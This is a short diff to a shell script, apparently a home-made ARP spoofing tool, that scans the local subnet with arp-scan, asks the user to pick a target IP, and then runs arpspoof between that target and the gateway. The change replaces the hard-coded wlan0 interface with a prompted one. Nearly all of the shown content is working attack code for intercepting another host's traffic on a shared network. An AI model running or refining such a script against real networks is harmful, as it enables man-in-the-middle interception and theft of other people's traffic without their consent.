@@ -9,11 +9,15 @@ sudo arp-scan $gateway/24
 read -p "Pleas Enter The ip from above: " ip
 until [ $ip -a $gateway ]
 do
-	echo "******************************please enter the ip*******************************"
+	echo "******************************please enter the ip,Gateway,Interface*******************************"
 	read -p "Pleas Enter The ip from above: " ip
+        read -p "enter the interface name [#ex:wlan0,eth0]: "  iface
 
 done
 #ARPSPOOF COMMANDS
-sudo arpspoof -i wlan0 -t $ip -r $gateway
+read -p "enter the interface name [#ex:wlan0,eth0]: "  iface
+sudo arpspoof -i $iface -t $ip -r $gateway
+
+
 
 
